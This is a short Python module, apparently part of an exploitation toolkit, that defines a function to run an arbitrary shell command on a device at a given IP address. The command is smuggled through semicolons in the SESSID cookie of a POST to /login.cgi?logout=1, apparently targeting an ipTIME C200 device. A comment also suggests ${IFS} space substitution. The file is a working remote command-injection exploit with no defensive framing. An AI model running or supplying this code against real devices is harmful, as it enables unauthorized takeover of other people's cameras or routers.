#! python !#
from misc.session import *
import urllib.parse

def iptimeC200(ip, cmd, session):
    try:
        #encode command as url
        command = urllib.parse.quote_plus(cmd)
        #command.replace(' ', '${IFS}')
        
        cookies = {
            'SESSID': f';{command};',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'zh-CN,zh;q=0.9,ru;q=0.8',
            'Cache-Control': 'max-age=0',
            'Proxy-Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            # 'Cookie': 'XSRF_TOKEN=1222440606',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
        }

        session.post(f'http://{ip}/login.cgi?logout=1', headers=headers, cookies=cookies, timeout=(5, 2))
        return True
    except Exception as e: return (False, e)